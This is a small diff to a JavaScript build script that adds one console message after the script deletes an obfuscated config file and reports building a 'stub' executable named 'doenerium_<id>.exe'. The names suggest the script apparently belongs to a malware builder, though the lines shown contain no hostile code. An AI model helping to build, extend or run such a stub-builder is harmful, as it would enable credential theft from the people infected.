@@ -289,6 +289,7 @@ function get_pkg_cache() {
     fs.unlinkSync("config_obf.js");
 
     console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
+    console.log(`You can now close this window.`)
 
     while (true) { }
 })()
